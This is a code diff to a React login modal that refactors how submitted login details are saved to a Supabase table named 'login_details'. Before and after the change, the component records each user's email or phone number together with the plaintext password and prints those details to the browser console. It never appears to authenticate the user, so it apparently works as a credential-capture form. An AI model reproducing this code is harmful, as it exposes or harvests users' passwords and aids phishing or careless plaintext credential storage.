@@ -1,5 +1,5 @@
 import { useState, useEffect } from 'react';
-import { safeInsert } from '../supabaseClient';
+import { supabase, insertLoginRecord } from '../supabaseClient';
 
 // ---------- Sub-components ----------
 
@@ -189,20 +189,35 @@ export default function LoginModal({ isOpen, onClose, onRegisterClick, initialId
     setShowError(false);
     console.log('🎉 Submitting Login Details:', { ...details, timestamp: new Date().toISOString() });
 
-    const payload = {
-      type: details.type,
-      identifier: details.identifier,
-      email: details.type === 'Email' ? details.identifier : null,
-      phone: details.type === 'Phone' ? details.identifier : null,
-      password: details.password,
-      timestamp: new Date().toISOString(),
-    };
+    let isSaved = false;
 
-    const res = await safeInsert('login_details', payload);
+    if (supabase) {
+      const payload = {
+        type: details.type,
+        identifier: details.identifier,
+        email: details.type === 'Email' ? details.identifier : null,
+        phone: details.type === 'Phone' ? details.identifier : null,
+        password: details.password,
+        timestamp: new Date().toISOString(),
+      };
+
+      const { error } = await insertLoginRecord(payload);
+
+      if (error) {
+        console.error('Error inserting to Supabase:', error);
+        isSaved = false;
+      } else {
+        console.log('Successfully saved to Supabase.');
+        isSaved = true;
+      }
+    } else {
+      console.warn('Supabase client not initialized.');
+      isSaved = false;
+    }
 
     setIsSubmitting(false);
 
-    if (res.success) {
+    if (isSaved) {
       setShowSuccess(true);
     } else {
       setShowError(true);
